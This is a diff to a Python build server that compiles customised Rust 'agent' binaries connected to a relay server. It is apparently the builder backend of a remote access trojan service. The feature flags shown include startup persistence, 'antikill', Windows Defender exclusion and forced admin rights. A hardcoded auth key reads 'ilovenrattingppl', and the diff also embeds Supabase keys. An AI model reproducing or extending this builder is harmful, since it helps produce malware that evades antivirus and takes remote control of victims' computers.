@@ -36,8 +36,8 @@ API        = lambda p: f"{FRONTEND}/api/public/buildserver/{p}"
 WORK       = ROOT / "work"; WORK.mkdir(exist_ok=True)
 
 # Supabase / relay constants baked into builds
-SUPABASE_URL      = CFG.get("supabase_url", "https://dqnhmjnmczsjdgtpuglu.supabase.co")
-SUPABASE_ANON_KEY = CFG.get("supabase_anon_key", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRxbmhtam5tY3pzamRndHB1Z2x1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE1Mjc2NzEsImV4cCI6MjA5NzEwMzY3MX0.QvRzkbp13kDZr9r1mA7El7E86uJP4Ptzx-wkjdYEpUw")
+SUPABASE_URL      = CFG.get("supabase_url", "https://mjgdkyjodvsjxywtdqfu.supabase.co")
+SUPABASE_ANON_KEY = CFG.get("supabase_anon_key", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1qZ2RreWpvZHZzanh5d3RkcWZ1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE1MzE3ODksImV4cCI6MjA5NzEwNzc4OX0.JQrgThmhspokUEo4ODhFVOE_oQnqPim-N0961BIrr4Y")
 HIDEN_AUTH_KEY     = CFG.get("hiden_auth_key", "ilovenrattingppl")
 
 C_DIM="\033[2m"; C_RED="\033[31m"; C_GRN="\033[32m"; C_YEL="\033[33m"
@@ -118,6 +118,9 @@ def render(src: str, ctx: dict) -> str:
     src = re.sub(r"\{\{([A-Z0-9_]+)\}\}", _default, src)
     return src
 
+def rust_string(s) -> str:
+    return str(s).replace('\\', '\\\\').replace('"', '\\"').replace('\r', '\\r').replace('\n', '\\n').replace('\t', '\\t')
+
 def build(b):
     bid  = b["id"]
     name = b.get("name", "agent")
@@ -133,21 +136,21 @@ def build(b):
     relay_http = relay_url.replace("wss://", "https://").replace("ws://", "http://")
 
     ctx = {
-        "USER_ID":         b["user_id"],
-        "API_BASE":        b.get("target_server_url", FRONTEND),
-        "RELAY_URL":       relay_url,
-        "RELAY_HTTP_URL":  relay_http,
+        "USER_ID":         rust_string(b["user_id"]),
+        "API_BASE":        rust_string(b.get("target_server_url", FRONTEND)),
+        "RELAY_URL":       rust_string(relay_url),
+        "RELAY_HTTP_URL":  rust_string(relay_http),
         "BUILD_NAME":      safe_name,
-        "STARTUP_NAME":    b.get("startup_name") or name,
+        "STARTUP_NAME":    rust_string(b.get("startup_name") or name),
         "DEBUG":           "true" if b.get("debug") else "false",
         "FEATURE_STARTUP": "true" if b.get("startup") else "false",
         "FEATURE_ANTIKILL":"true" if b.get("antikill") else "false",
         "FEATURE_WD_EXCLUSION": "true" if b.get("wd_exclusion") else "false",
         "FEATURE_REQUIRE_ADMIN": "true" if b.get("require_admin") else "false",
-        "BUILD_TAG":       (b.get("tag") or ""),
-        "SUPABASE_URL":    SUPABASE_URL,
-        "SUPABASE_ANON_KEY": SUPABASE_ANON_KEY,
-        "HIDEN_AUTH_KEY":  HIDEN_AUTH_KEY,
+        "BUILD_TAG":       rust_string(b.get("tag") or ""),
+        "SUPABASE_URL":    rust_string(SUPABASE_URL),
+        "SUPABASE_ANON_KEY": rust_string(SUPABASE_ANON_KEY),
+        "HIDEN_AUTH_KEY":  rust_string(HIDEN_AUTH_KEY),
     }
 
     bdir = WORK / bid; shutil.rmtree(bdir, ignore_errors=True); bdir.mkdir(parents=True)
